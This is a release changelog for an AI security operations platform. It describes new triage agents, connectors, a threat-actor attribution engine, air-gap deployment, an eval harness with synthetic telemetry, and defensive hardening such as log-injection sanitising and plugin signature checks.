  against the tenant's detection repo when a detection proposal is promoted.
  Supports GHES and github.com via `GITHUB_API_URL` env var.
- 25 playbook YAML templates added under `detections/playbooks/` and 12 pre-built
  playbook packs under `playbooks/packs/v1/`.

#### WS-D1 — BYOK Per-Tenant Settings UI

- **`apps/web/src/components/settings/SettingsView.tsx`** — New "AI / LLM"
  settings panel: provider picker (OpenAI, Azure OpenAI, Anthropic, Ollama),
  API-key input, model selector, temperature slider, and connection test button.
- **`apps/web/src/components/settings/SettingsView.byok.test.tsx`** — 12 Vitest
  tests covering form rendering, provider switching, key masking, connection test
  success/error paths, and save confirmation.

#### WS-D2 — Investigation Timeline (Replayable)

- **`apps/web/src/components/copilot/InvestigationTimeline.tsx`** — 684-line
  React component that renders the investigation ledger as a playable timeline.
  Each step shows the agent name, tool call, rationale, duration, and status
  badge. A scrubber lets analysts replay from any step.

#### WS-D3 — Case Auto-Summary + PDF Export

- **`services/api/app/services/case_summary.py`** — LLM-powered case summariser
  (structured output via function-calling). Produces `CaseSummaryResult` with
  `headline`, `severity_rationale`, `recommended_action`, and `evidence_links`.
- **`services/api/app/services/case_summary_html.py`** — HTML renderer for the
  summary, used by the PDF exporter and the in-browser case card.

#### WS-F1 — Light Theme Persisted in User Profile

- **`apps/web/src/components/theme/ThemeProvider.tsx`** — Theme preference
  (`light` | `dark` | `system`) stored in `localStorage` and synced to
  `PATCH /api/v1/users/me/preferences`. Survives logout and device switch.

#### WS-F2 — WCAG AA Accessibility (axe-core CI gate)

- **`apps/web/src/test/a11y.test.tsx`** — 55-line axe-core test suite. Renders
  `AlertsView`, `CasesView`, `PlaybooksView`, `DashboardView`, and 3 modal
  components; fails the build if any WCAG 2.1 AA violation is found.
- Sidebar landmark roles, ARIA labels, focus trapping in modals, skip-navigation
  link, and colour-contrast fixes applied across the entire component tree.

#### WS-F3 — Saved Views + Drag-Drop Dashboard Widgets

- **`apps/web/src/components/dashboard/DashboardView.tsx`** — Dashboard is now
  fully composable: widgets can be dragged, dropped, resized, pinned, and
  removed. Layout serialised to `POST /api/v1/saved-views`.
- **`services/api/app/api/v1/endpoints/saved_views.py`** — CRUD for per-user
  saved views (dashboard layout, column configs, active filters).

#### WS-G1/G2 — Threat Actor Attribution Engine v0 + Air-Gap Mode

- **`services/threatintel/app/actors/attribution.py`** — New
  `ThreatActorAttributionEngine` scores observed IOCs, MITRE ATT&CK
  techniques, tools, and target sectors against an in-memory catalog of
  three seed actor profiles (APT28, APT29, Lazarus). Scoring is the
  weighted sum of TTP (0.4) / Tool (0.3) / Target (0.2) / IOC (0.1)
  components, multiplied by the actor profile's baseline confidence,
  then thresholded.
- **`services/threatintel/app/api/actor_attribution.py`** — New router
  mounted at `/api/v1/actors` with `POST /attribute`, `GET /profiles`,
  and `GET /profiles/{actor_id}`. Constructs the engine once via
  FastAPI lifespan and passes it through `Depends(get_attribution_engine)`.
- **`services/agents/app/agents/investigation_agent.py`** — Investigation
  agent now calls `POST /actors/attribute` and surfaces attribution results
  in the investigation ledger.
- **`docker-compose.airgap.yml`** — Compose override for fully disconnected
  deployments: disables all external feed pullers, enables Ollama sidecar, and
  sets `AIRGAP_MODE=true` so the API switches to local-only LLM routing.
- **`apps/docs/docs/operations/air-gapped.md`** — Step-by-step air-gap
  deployment guide: image pre-pulling, Ollama model loading, threat-feed
  pre-seeding, and smoke-test checklist.

#### WS-H1 — MSSP Console Improvements

- **`services/api/app/api/v1/endpoints/mssp.py`** — New `GET /mssp/tenants`
  aggregation endpoint: per-child tenant alert counts, open case counts, SLA
  breach rate, and last-seen connector heartbeat.
- **`services/api/app/models/tenant.py`** — Added `parent_tenant_id` and
  `mssp_role` columns supporting the parent-child tenant hierarchy.

#### WS-H2 — BYOK Per-Tenant LLM Credentials

- **`services/api/app/api/v1/endpoints/llm_credentials.py`** — CRUD for per-tenant
  LLM credential records. Secrets encrypted at rest via `CredentialVault`.
- LLM routing layer (`services/api/app/core/config.py`) reads per-tenant
  credentials before falling back to the platform-wide key.

#### WS-H3 — Team Analytics View

- **`apps/web/src/components/analytics/TeamAnalyticsView.tsx`** — Analyst
  leaderboard with MTTR per analyst, alert disposition accuracy, cases closed
  per shift, and false-positive rate trend over the selected window.

#### WS-H4 — Air-Gapped / Ollama Local-LLM Mode

- **`services/api/app/api/v1/endpoints/llm_status.py`** — Reports whether the
  deployment is running in air-gap mode and which local models are available
  via the Ollama sidecar. Used by the settings UI to auto-populate the model
  picker.

### Fixed

- Ruff `E501/W291/W293/B007/B017/F821/I001` violations in `services/api`.
- `mypy` errors across all 16 plan-modified files: `RowMapping` import,
  `Optional` list `len()`, `current_user.user_id` rename, `fetchone()` None
  checks, `sort_key` return type, `PYTHONPATH` subprocess handling.
- Converted structlog-style `logger.info(key=value)` calls to stdlib formatting
  in `rule_engine.py`, `neo4j.py`, and `digest_pdf.py`.
- SQLAlchemy relationship `name-defined` mypy errors suppressed with
  `# type: ignore[name-defined]` in `tenant.py` and `connector.py`.

### Security caveat

The `/api/v1/actors/*` endpoints are reachable on the `threatintel`
service without RBAC enforcement in v0 — they assume cluster-internal
network reachability only. Do **not** expose them through public
ingress until a `Depends(require_permission(...))` guard is added.
Tracked as a known limitation in the docs.

---

### Added — Threat Actor Attribution Engine (v0)

- **`services/threatintel/app/actors/attribution.py`** — New
  `ThreatActorAttributionEngine` scores observed IOCs, MITRE ATT&CK
  techniques, tools, and target sectors against an in-memory catalog of
  three seed actor profiles (APT28, APT29, Lazarus). Scoring is the
  weighted sum of TTP (0.4) / Tool (0.3) / Target (0.2) / IOC (0.1)
  components, multiplied by the actor profile's baseline confidence,
  then thresholded.
- **`services/threatintel/app/api/actor_attribution.py`** — New router
  mounted at `/api/v1/actors` with `POST /attribute`, `GET /profiles`,
  and `GET /profiles/{actor_id}`. Constructs the engine once via
  FastAPI lifespan and passes it through `Depends(get_attribution_engine)`.
- **`services/agents/app/agents/investigation_agent.py`** — Investigation
  agent now calls the attribution API after triage/enrichment and
  records the result on `state.threat_intel["attribution"]`. Failure is
  soft and surfaces a `[medium]` finding rather than aborting the
  investigation.
- **`docs/threat-actor-attribution.md`** — Full operator-facing docs,
  including scoring model, API surface, observability, env vars, v0
  caveats, and instructions for adding custom profiles.

### Configuration

- `AISOC_ATTRIBUTION_THRESHOLD` — Override the default confidence
  threshold (`0.30`). Clamped to `[0.0, 1.0]`; invalid values fall back
  to the default and emit a warning.
- `AISOC_THREATINTEL_URL` — Base URL the agent uses to reach the
  `threatintel` service. Default: `http://threatintel:8083`.
- `AISOC_ATTRIBUTION_TIMEOUT_SECONDS` — HTTP timeout the agent uses for
  attribution calls. Default: `10`.

### Observability

- New Prometheus series exported by `threatintel`:
  - `threatintel_attribution_requests_total{result="matched|unknown|error"}`
  - `threatintel_attribution_score{actor_id}` (histogram)

### Engine internals

- Tool matching uses an alphanumeric-only boundary regex
  (`(?<![a-zA-Z0-9])tool(?![a-zA-Z0-9])`) instead of Python's `\b`.
  Python's `\b` treats `_` as a word character, which broke common
  malware-filename patterns like `miniduke_v3.dll`. The new boundary
  treats `_`, `-`, `.`, and `/` as delimiters while still rejecting
  alphanumeric neighbours (so `x-agent` does not match `x-agentic`).
- Tool matching now also scans the IOC's `description` and `tags`
  fields, not just `value`.
- IOC lookups go through a new public method `OpenSearchStore.match_ioc_values()`
  rather than reaching into `os_store._os.search()` directly.
- The attribution engine accepts a `catalog` constructor argument so
  tests and downstream services can inject custom profiles without
  monkey-patching module-level state.
- An empty catalog now resolves to `actor_id="unknown"` with explicit
  reasoning (`"Actor catalog is empty"`), instead of confusingly
  falling through to the no-match-above-threshold branch.

### Security caveat

The `/api/v1/actors/*` endpoints are reachable on the `threatintel`
service without RBAC enforcement in v0 — they assume cluster-internal
network reachability only. Do **not** expose them through public
ingress until a `Depends(require_permission(...))` guard is added.
Tracked as a known limitation in the docs.

## [6.1.0] — 2026-05-07

### Added — v1.5 market-driven feature expansion

A review of G2, Gartner Peer Insights, and customer feedback on AI SOC / SIEM /
SOAR platforms drove this release. Five new agents, eight new console pages,
four new API surfaces, and ten new connectors landed at once. Connector catalog
goes from 16 → **26**.

#### New autonomous agents (`services/agents/app/agents/`)

- **`auto_triage_agent.py`** — Master triage agent classifies each incoming alert
  as `true_positive` / `false_positive` / `benign` with a confidence score.
  Low-confidence noise auto-closes; everything else escalates with rationale.
- **`phishing_agent.py`** — Specialised phishing triage: header analysis, URL
  reputation, attachment sandboxing summary, sender-domain trust.
- **`identity_agent.py`** — Identity-centric reasoning: impossible travel,
  privilege escalation, MFA bypass, and session-token anomaly classification.
- **`cloud_agent.py`** — Cloud posture / threat reasoning across AWS, Azure,
  GCP, and Kubernetes signals.
- **`insider_threat_agent.py`** — Behavioural deviation, peer-group scoring,
  exfiltration intent classification.
- All five are exposed via `POST /api/v1/agents/triage`.

#### New console pages (`apps/web/src/components/`)

- **`/investigate`** — Conversational, multi-turn copilot anchored on a case;
  reads its evidence, ledger, and entity graph for grounded follow-up Q&A.
  Component: `copilot/InvestigationChat.tsx`.
- **`/coverage-advisor`** — Ranks MITRE ATT&CK technique gaps by adversary
  prevalence and recommends rules to close them.
  Component: `coverage/CoverageAdvisorView.tsx`.
- **`/shifts`** — Outgoing/incoming analyst handoff dashboard: active cases,
  in-flight investigations, queued approvals on one screen.
  Component: `shifts/ShiftsView.tsx`.
- **`/easm`** — External Attack Surface Management: discovers public assets,
  exposed services, and certificate-expiry risks.
  Component: `easm/EASMView.tsx`.
- **`/mssp`** — MSSP executive dashboard: KPIs, cross-tenant alert volume, and
  per-customer SLA posture. Component: `mssp/MSSPDashboardView.tsx`.
- **`/noise-tuning`** — Per-rule false-positive rate, suppression candidates,
  one-click tuning. Component: `noise/NoiseTuningView.tsx`.
- **`/analytics/team`** — Analyst leaderboard, MTTR per analyst, dispositions
  accuracy, and shift workload balance.
  Component: `analytics/TeamAnalyticsView.tsx`.

#### New API surfaces (`services/api/app/api/v1/endpoints/`)

- **`shifts.py`** — Shift-handoff CRUD: list active shifts, post handoff
  notes, view queued approvals scoped to a shift window.
- **`stix_taxii.py`** — STIX 2.1 / TAXII 2.1 publishing; pushes the tenant's
  IOCs and threat-actor profiles to upstream / community feeds.
- **`compliance.py`** — Automated compliance evidence collection for SOC 2,
  ISO 27001, NIST CSF, PCI-DSS, HIPAA, and DORA. One-click evidence pull.
- **`deployment.py`** — Deployment / air-gap toggles; tenants that disallow
  external feeds can flip air-gap mode here.

#### New connectors (`services/connectors/app/connectors/`)

EDR / XDR: `sentinelone.py`, `cortex_xdr.py`. Cloud security: `wiz.py`,
`snyk.py`. Network: `zscaler.py`. SaaS / email: `proofpoint.py`,
`servicenow.py`, `jira.py`. Identity: `1password.py`, `duo_security.py`.
All ten registered in `services/connectors/app/connectors/__init__.py`,
all ship a marketplace manifest under `plugins/<id>/plugin.yaml`, all
collapse vendor severity to the standard four-tier ladder.

#### Other

- **AI-generated incident reports** — Every case now has a one-click "Export
  Report" button that generates a PDF incident report from the Investigation
  Ledger.
- **Air-gap deployment configuration** — Per-tenant toggles disable external
  feeds (threat intel, marketplace sync, push notifications) for fully
  air-gapped deployments.

### Changed

- Connector catalog count **16 → 26**. Landing page hero stat, layout SEO
  metadata, and `apps/docs/docs/connectors/index.md` updated to reflect.
- `apps/docs/docs/architecture.md` adds a v1.5 section and updates the
  service-responsibilities table to include the new API surfaces and
  autonomous agents.
- `apps/docs/docs/intro.md` updated to mention the new connector count and
  v1.5 features.
- Footer release link now points at `v6.1.0`.

## [6.0.1] — 2026-05-06

### Security

- **Log-injection mitigation** (`services/api/app/api/v1/endpoints/connectors.py`) —
  `connector_type` originates from user-supplied query parameters and was previously
  logged verbatim, leaving an injection path for newlines/control characters into
  structured log records. A character-allowlist reconstructor (`_safe_connector_type`)
  now strips every character outside `[a-zA-Z0-9_\-]` before the value reaches any
  log call, breaking CodeQL's taint trace (alert `py/log-injection`).

- **Remove dead rate-limiter code** (`services/realtime/src/index.ts`) —
  The hand-rolled `makeRateLimiter` function was superseded by `express-rate-limit`
  in the previous release but not removed, leaving dead code that masked the
  effective rate-limiting path. The function is now deleted; `express-rate-limit`
  is the sole limiter in production (resolves CodeQL alert `js/unused-local-variable`).

## [6.0.0] — 2026-05-06

### Added

#### Wave 3 — Operational Maturity

- **MSSP / parent-tenant console** (`services/api/migrations/012_mssp_console.sql`,
  `services/api/app/models/mssp.py`, `services/api/app/api/v1/endpoints/mssp.py`) —
  Parent tenants can onboard child tenants, manage cross-tenant delegations, add
  per-tenant notes, and view an aggregated metrics rollup in a single pane.

- **Asset inventory + vuln-to-alert correlation** (`services/api/migrations/013_asset_inventory.sql`,
  `services/api/app/models/asset.py`, `services/api/app/api/v1/endpoints/assets.py`) —
  CRUD for discovered assets with vulnerability findings auto-correlated to alerts.
  Surfaces asset blast radius and enables asset-context enrichment during triage.

- **Insider threat module** (`services/api/migrations/014_insider_threat.sql`,
  `services/api/app/models/insider_threat.py`,
  `services/api/app/api/v1/endpoints/insider_threat.py`) —
  User risk profiles, behavioural indicators, peer-group deviation scoring, and
  watchlist management. Risk scores update incrementally as new indicators arrive.

- **L0–L4 auto-remediation maturity tiers** (`services/api/migrations/015_remediation_maturity.sql`,
  `services/api/app/models/remediation.py`,
  `services/api/app/api/v1/endpoints/remediation.py`,
  `services/actions/app/services/maturity.py`) —
  Per-tenant configuration of remediation autonomy from L0 (manual only) through L4
  (fully autonomous). Gate log records every approve/block decision. Per-action whitelist
  pre-approves low-risk actions regardless of tier.

#### Wave 4 — Advanced Capabilities

- **Internal threat intelligence** (`services/api/migrations/016_threat_intel.sql`,
  `services/api/app/models/threat_intel.py`,
  `services/api/app/api/v1/endpoints/threat_intel.py`) —
  IOC harvesting from alert history, threat actor and campaign profiles, and STIX/TAXII
  feed subscription management, all queryable via the REST API.

- **Cloud security posture management (CSPM/KSPM)** (`services/api/migrations/017_cspm.sql`,
  `services/api/app/models/posture.py`, `services/api/app/api/v1/endpoints/posture.py`) —
  Ingests posture findings from cloud providers, tracks drift between scan runs, and
  surfaces a per-provider posture summary with suppress/resolve workflows.

- **Identity-centric correlation graph** (`services/api/migrations/018_identity_graph.sql`,
  `services/api/app/models/identity_graph.py`,
  `services/api/app/api/v1/endpoints/identity_graph.py`) —
  Graph of users, devices, service accounts, and roles with typed relationship edges.
  Alerts link to identity nodes, enabling blast-radius queries and attack-path
  reconstruction.

- **Auto-generated board reports** (`services/api/migrations/019_board_reports.sql`,
  `services/api/app/models/report.py`, `services/api/app/api/v1/endpoints/reports.py`) —
  Report templates and scheduled generation of PDF/HTML executive summaries. Artefacts
  are stored, versioned, and deliverable via email or webhook.

#### Platform

- **Dashboard metrics API** (`services/api/app/api/v1/endpoints/metrics.py`) —
  `/api/v1/metrics/dashboard` aggregates alert KPIs, case counts, connector source
  stats, top MITRE tactics, 24-hour alert trend, and threats-by-source for the
  frontend dashboard tiles. `/api/v1/metrics/alerts/trend` supports `1h / 24h / 7d / 30d`
  period buckets.

- **Tailscale connector** (`services/connectors/app/connectors/tailscale.py`) —
  Pulls audit logs and policy-file change events from the Tailscale API with
  OAuth client-credential and API-key auth, cursor-based pagination, and four-tier
  severity mapping.

- **AWS GuardDuty credential-exfiltration detection** (`detections/cloud/aws-guardduty-instance-credential-exfiltration.yaml`) —
  Sigma rule covering EC2 instance credential exfiltration via `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration`.

---

### Click-and-connect cloud connector platform

This pass turns connectors from a hardcoded, code-edit-only feature into a
runtime, schema-driven, click-and-connect surface — and lights up nine new
cloud / SaaS / VCS sources (Microsoft Entra, Azure Activity, Defender XDR,
GCP Cloud Audit, GCP SCC, Microsoft 365 audit, Google Workspace, Cloudflare,
GitHub) on top of the original CrowdStrike / Splunk / AWS Security Hub /
Okta / Microsoft Sentinel set.

#### Added

- **`CredentialVault`** (`services/api/app/security/credential_vault.py`,
  `services/connectors/app/security/credential_vault.py`) — Fernet
  (AES-128-CBC + HMAC-SHA256) wrapper for `auth_config` JSON, keyed off the
  new `AISOC_CREDENTIAL_KEY` env var. Supports `MultiFernet` rotation via
  `AISOC_CREDENTIAL_KEY_ROTATION_FROM`. The `services/connectors`
  read-path mirror decrypts only; writes always go through the API
  service. Documented in [docs/operations/credentials](apps/docs/docs/operations/credentials.md).
- **Self-describing connector schemas** (`services/connectors/app/connectors/base.py`)
  — `BaseConnector` gained a `Field` / `OAuthHints` / `ConnectorSchema`
  trio and an abstract `schema()` classmethod. Each connector class is now
  the source of truth for its own `name`, `connector_category`, fields
  (text / secret / select / textarea / oauth), default poll interval, and
  hosted-OAuth roadmap hints. The hardcoded dict in
  `services/connectors/app/api/router.py` is gone — schema responses come
  from the registry built in `services/connectors/app/connectors/__init__.py`.
- **`/api/v1/connectors` CRUD endpoints**
  (`services/api/app/api/v1/endpoints/connectors.py`,
  `services/api/app/schemas/connector.py`) — `GET /catalog`, `POST /test`,
  `GET / POST / PATCH / DELETE /instances`, `POST /instances/{id}/test`.
  Tenant-scoped via the existing auth dependency, secrets encrypted on
  write through the vault, and proxied to the connectors microservice for
  schema lookups and live `Test connection` calls.
- **`ConnectorScheduler`** (`services/connectors/app/scheduler.py`) —
  APScheduler in-process inside `services/connectors`, started in the
  FastAPI lifespan. One job per enabled instance, polls
  `fetch_alerts(since_seconds=300)` every 5 min by default
  (`connector_config.poll_interval_seconds` overrides per instance),
  decrypts via the read-path vault, normalizes events through the
  connector's `normalize()` method, and pushes the batch to
  `services/ingest/v1/ingest/batch` via the new `IngestClient`. Set
  `AISOC_CONNECTORS_DISABLE_SCHEDULER=1` to skip wiring the scheduler in
  tests.
- **Nine new connectors** in `services/connectors/app/connectors/`:
  `azure_entra` (Microsoft Graph audit logs), `azure_activity` (ARM
  Activity Log via Resource Graph + blast-radius `_HIGH_BLAST_RADIUS_VERBS`
  list), `azure_defender` (Microsoft Graph Security alerts),
  `gcp_cloud_audit` (Cloud Logging API with hand-rolled RS256 JWT
  signing for service-account auth), `gcp_scc` (Security Command Center
  findings, same JWT signer), `m365_audit` (Office 365 Management
  Activity API, sharing the Azure AD app from `azure_entra`),
  `google_workspace` (Reports API with domain-wide delegation),
  `cloudflare` (Audit Logs), and `github` (Org Audit Log + Code Scanning
  alerts). Every connector ships unit tests covering schema contract,
  normalization, and `test_connection()` happy/sad paths
  (`services/connectors/tests/test_*_connectors.py`,
  `test_schemas.py`, `test_scheduler.py`).
- **Frontend click-and-connect wizard**
  (`apps/web/src/components/connectors/AddConnectorModal.tsx`,
  `ConnectorInstanceList.tsx`, rewired
  `ConnectorsView.tsx`, typed client in `apps/web/src/lib/api.ts`) —
  two-step modal: (1) catalog grid grouped by category, (2)
  schema-driven form with `text` / `secret` / `select` / `textarea`
  fields, an inline `Test connection` button, and a `Save & enable`
  action. `framer-motion` for transitions, `react-hot-toast` for
  feedback. Existing connector cards now render from the live API via
  SWR.
- **Marketplace + plugin manifests** —
  `plugins/{azure-entra, azure-activity, azure-defender, gcp-cloud-audit,
  gcp-scc, m365-audit, google-workspace, cloudflare, github}/plugin.yaml`
  carry the new `schema()` shape so `scripts/build_marketplace.py` can
  surface them in the in-app Marketplace, and
  `apps/web/public/marketplace/index.json` is regenerated via
  `pnpm marketplace:sync`.
- **Documentation** — `apps/docs/docs/connectors/index.md` (catalog
  landing with a connector walkthrough and category taxonomy), nine
  per-connector setup walkthroughs (prereqs, scopes, screenshots),
  `apps/docs/docs/operations/credentials.md` (vault threat model, key
  rotation procedure, hosted-OAuth roadmap), and a new `Connectors`
  section in `apps/docs/sidebars.ts`.

#### Changed

- **`services/api/app/core/config.py`** — added `AISOC_CREDENTIAL_KEY`,
  `AISOC_CREDENTIAL_KEY_ROTATION_FROM`, `CONNECTORS_SERVICE_URL`,
  `CONNECTORS_SERVICE_TIMEOUT_SECONDS`. Documented in `.env.example`.
- **`services/api/app/main.py`** — the new `/api/v1/connectors` router is
  mounted alongside the existing v1 router set.
- **`services/connectors/app/api/router.py`** — schema responses lookup
  the registry instead of returning a hardcoded dict; new
  `POST /connectors/{connector_id}/test` endpoint runs an
  unauthenticated dry-run `test_connection()` for the wizard's
  pre-save Test step.
- **`services/connectors/app/main.py`** — the FastAPI lifespan now wires
  the scheduler, with `AISOC_CONNECTORS_DISABLE_SCHEDULER` honored for
  tests and CI.

#### Why this matters

Before this pass: adding a connector meant editing Python in three places,
shipping a release, and reading docs to discover the auth fields. Secrets
sat in plain JSON in Postgres. After this pass: connectors are runtime
data; secrets are encrypted with a key the operator controls; rotation
is a documented procedure; the wizard's `Test connection` round-trip
catches bad credentials before they're saved; and the per-connector docs
each give an analyst a 5-minute path from "I have a tenant" to "alerts
are flowing into the console."

---

### Eval harness v1.4 — synthetic telemetry + per-template macros

This pass addresses two questions raised on the public launch thread about
the v5.2 eval harness:

1. **"Any interest in shipping synthetic telemetry (M365 audit, CloudTrail,
   Sysmon) backing each incident?"** — Yes. A companion
   `synthetic_telemetry.jsonl` corpus is now generated alongside
   `synthetic_incidents.json` and gives connector and Sigma PRs a concrete
   contract to wire against without provisioning a real tenant.
2. **"INC-EVAL-044, 099, and 154 are the same template with `{user}/{host}`
   swapped — what does the multiplier buy vs. the dilution in regression
   signal?"** — The multiplier still buys breadth for connector regressions,
   but the eval suites now report a per-template macro alongside the
   per-case mean so a single broken template (~4 cases) moves the regression
   signal by ~1.8% rather than ~0.5%, and the failing template IDs are
   surfaced inline.

#### Added

- **Synthetic telemetry corpus**
  (`services/agents/tests/eval_data/synthetic_telemetry.jsonl`,
  `scripts/generate_eval_incidents.py`) — 361 backing events spanning 14
  log sources (Sysmon, Windows Security, M365 audit, Azure sign-in,
  CloudTrail, Linux auditd, journald, EDR, DNS, web access, Kubernetes
  audit, GitHub audit, VPN, DB audit), wired to all 200 incidents. Each
  event is a templated dictionary with `{user}/{host}/{ip}/{campaign}`
  placeholders resolved against the incident it backs, and carries the
  fields a real connector pivots on (process tree, principal, source IP,
  log source, event ID).
- **Telemetry event factories + recursive resolver**
  (`scripts/generate_eval_incidents.py`) — `_sysmon`, `_winsec`, `_m365`,
  `_azure_signin`, `_cloudtrail`, `_auditd`, `_journald`, `_edr`, `_dns`,
  `_web`, `_k8s`, `_github`, `_vpn`, `_db` produce base event shapes; a
  recursive resolver walks nested dicts and substitutes incident
  context. The 55 templates in `_TEMPLATES` each now carry a
  `template_id`, a `template_index`, and a tuple of telemetry events.
- **Schema + coverage gate** (`services/agents/tests/test_synthetic_telemetry.py`)
  — five new assertions: every incident has ≥ 1 backing event, every
  expected source is present, every event carries the source-specific
  pivot fields a real connector needs, all placeholders resolve, and no
  single template dominates the source distribution.
- **Per-template macros on every scoring suite**
  (`services/agents/tests/test_mitre_accuracy.py`,
  `test_investigation_completeness.py`, `test_response_quality.py`,
  `scripts/run_evals.py`) — each result now carries a
  `per_template_summary()` (mean, median, min, max, count, failing IDs)
  alongside the per-case mean, plus a new test gating macro accuracy ≥
  0.80 for MITRE / completeness and ≥ 0.75 for response-plan quality. A
  template-distribution-balance test asserts no single template accounts
  for > 5% of incidents (currently 0.5–2.0% each).
- **`run_evals.py` output expansion** — each suite headline now prints
  the per-case mean *and* the per-template macro with the failing
  template IDs inline; the human-readable summary appends a synthetic-
  telemetry footer (event count, source count, incident coverage, file
  path); `--json` output adds `per_template` and `telemetry` blocks.

#### Changed

- **Incident schema** — `synthetic_incidents.json` entries now include
  `template_id` (e.g. `m365_admin_impersonation`) and `template_index`
  fields. Existing fields are unchanged. Regenerated deterministically
  from the seeded RNG.
- **`apps/docs/docs/benchmark.md`** — added a "What's new (v1.4)"
  section, a "Per-case vs. per-template metrics" section explaining the
  ~0.5% vs ~1.8% sensitivity argument with worked examples, and a new
  "Synthetic telemetry corpus" section documenting the 14 sources, the
  pivot fields, the placeholder resolver, and the five schema/coverage
  checks. The "Help us harden the harness" call-outs now include adding
  a connector + Sigma rule against the corpus and adding a new template
  with backing telemetry. The "What this is not" section is updated to
  call out that the corpus is hand-shaped (not captured from a live
  tenant) and that the per-template macro is the non-tautological signal
  on top of the otherwise self-consistent gates.
- **`README.md`** — capability bullet rewritten to call out five suites
  (was four), 55 distinct templates, per-case + per-template macros, and
  the synthetic-telemetry coverage gate. The comparison table flags the
  eval harness as having a synthetic-telemetry corpus + per-template
  macros. Step 5b (`Run the public eval harness`) documents the new
  `python scripts/generate_eval_incidents.py` workflow for regenerating
  the dataset and the corpus together.
- **Eval signature on completeness + response-quality runs** — calls
  from `run_evals.py` now use `keep_per_incident=True` so the per-
  template summary is computable. Default behaviour unchanged for
  existing direct callers.

#### Why this matters

The v5.2 harness gave deterministic numbers but two real concerns existed:
duplicates could mask a broken template behind 199 working duplicates, and
there was no concrete telemetry shape for connector contributors to wire
against. v1.4 closes both: the per-template macro is the dilution-resistant
regression signal that surfaces template-class breaks, and the synthetic
telemetry corpus is the connector-development contract.

---

### Honesty + scale pass (P0–P4 of the post-gimmick improvement plan)

This is a "fix the foundations" pass: tighten security defaults, drop
overclaims, harden CI, fix DX rough edges, scale detection content from
~200 to 6,913 rules with explicit tiering, and ship a public demo
hosted on `tryaisoc.com` via Cloudflare Tunnel.

#### Security defaults (P0)

- **GraphQL tenant scoping** (`services/api/app/graphql/`) — every
  resolver is wrapped with a `tenant_scope` helper, GraphiQL is forced
  off in production, and a tenant-isolation regression test asserts
  cross-tenant reads return 0 rows.
- **Plugin signature gate** (`services/api/app/services/plugin_manager.py`,
  `packages/plugin-sdk-py/src/aisoc_plugin_sdk/loader.py`,
  `packages/plugin-sdk-go/aisoc/loader.go`) — Ed25519 signature
  verification is required before loading any plugin. `PLUGIN_TRUST_MODE`
  controls policy: `strict` (default, signed only), `permissive` (warn
  + load), `dev` (skip). Publisher signing flow is documented in
  `packages/plugin-sdk-py/README.md` and `packages/plugin-sdk-go/README.md`.
- **`/metrics` and compose hardening** (`docker-compose.yml`,
  `docker-compose.demo.yml`, `services/api/app/main.py`,
  `services/api/app/core/security.py`) — service ports bind to
  `127.0.0.1` by default, the API logs a loud warning if `SECRET_KEY`
  is unset or default, the `admin` role permissions are corrected to
  match the documented matrix, and `/metrics` is gated behind
  `METRICS_TOKEN`.

#### Honesty surface (P1)

- **Fusion pipeline framing** (`services/agents/app/fusion/`,
  `apps/docs/docs/architecture.md`) — replaced "real fusion pipeline"
  with the actual scope (rule-based + ML scoring fan-in, no
  reinforcement learning).
- **CI cadence wording** (`README.md`, `CONTRIBUTING.md`) — "every
  commit" → "every push and PR to `main`".
- **Eval harness honesty** (`scripts/eval/`, `apps/docs/docs/`) —
  removed "Macro F1" references, reframed the 200-incident synthetic
  dataset as substrate self-consistency, dropped the hardcoded
  `SUITES` constant, fixed the broken `--report` flag, and aligned
  Prophet usage in code and docs.

#### CI gates (P2)

- **No more `|| true`** (`.github/workflows/ci.yml`) — removed every
  silent failure suppression.
- **Web Vitest smoke** — `apps/web` ships a Vitest suite covering
  marketplace filters, detection coverage view, and core layouts.
- **SDK + service jobs** — added Python pytest + Vitest jobs for
  `packages/sdk-{py,ts,go}` and `packages/plugin-sdk-{py,go}`, plus
  pytest jobs for `services/{api,agents,actions,connectors}`.
- **Detection + playbook validation in CI**
  (`.github/workflows/validate-detections.yml`,
  `.github/workflows/check-openapi.yml`) — `validate_detections.py`
  runs against all 6,913 rules and the OpenAPI spec is regenerated
  and compared on every PR.

#### DX (P3)

- **`aisoc-doctor` probes fixed** (`tools/aisoc-doctor/`) — checks
  match the actual ports, env var names, and service URLs.
- **CLI consistency** (`packages/cli/`, `README.md`,
  `apps/docs/docs/`) — `npx aisoc` and `aisoc` resolve identically;
  package names, missing pnpm scripts, and the `mcp` service
  reference are corrected; branching/tooling and env var names match
  across docs.
- **Infra READMEs** — `infra/k8s/`, `infra/helm/`, `infra/terraform/`,
  `infra/render/`, `infra/fly/`, `infra/railway/`, `infra/coolify/`
  each have a `README.md` documenting prerequisites, secrets, and
  invocation.

#### Detection scale + tiering (P4)

- **800 native rules** — added 600 new Sigma-shaped detections across
  five new spec modules (`scripts/detection_specs_part3_cloud.py`,
  `_identity.py`, `_endpoint.py`, `_network.py`,
  `_application.py`), each with `match_when`, MITRE tagging, and
  auto-generated positive/negative fixtures via
  `scripts/detection_specs_part3_helpers.py`. Native total:
  200 → **800**.
- **6,113 imported rules with provenance** — wired importers under
  `tools/detection_import/{sigma,splunk,chronicle,car}_importer.py`
  for SigmaHQ, Splunk Security Content, Chronicle, and MITRE CAR.
  Each imported rule is tagged with its source, license, and original
  ID; rules whose mappings cannot be replayed against AiSOC fixtures
  are quarantined under `detections/<source>-imports/quarantine/`
  (~5,937 quarantined, ~6,113 active).
- **Title → name migration** — imported YAMLs now use the canonical
  `name:` field instead of `title:`, matching `validate_detections.py`'s
  required schema. `tools/detection_import/common.py` was updated and
  6,113 existing files were migrated in place.
- **Marketplace tier UX** (`apps/web/src/components/marketplace/MarketplaceView.tsx`,
  `MarketplaceView.test.tsx`, `marketplace/index.json`,
  `apps/web/public/marketplace/index.json`,
  `scripts/build_marketplace.py`) — items now expose a `tier` field
  (`stable` / `beta` / `imported` / `community`), the marketplace UI
  defaults to `stable` and shows per-tier counts on filter chips,
  and `build_marketplace.py` infers tiers from `plugin.yaml` and
  source paths.
- **MITRE ATT&CK coverage view** (`apps/web/src/app/(app)/detection/coverage/`,
  `apps/web/src/lib/mitreTactics.ts`) — new in-app dashboard rendering
  the coverage matrix from the marketplace index.
- **Documentation refresh** — updated `README.md`,
  `apps/docs/docs/intro.md`, `apps/docs/docs/quickstart.md`,
  `apps/docs/docs/concepts/detections.md`,
  `apps/docs/docs/contributing/dev-setup.md`,
  `detections/README.md`, and `.github/workflows/validate-detections.yml`
  to reflect 800 native + ~6,000 imported (filterable by tier) and
  drop stale "200+ rules" claims.

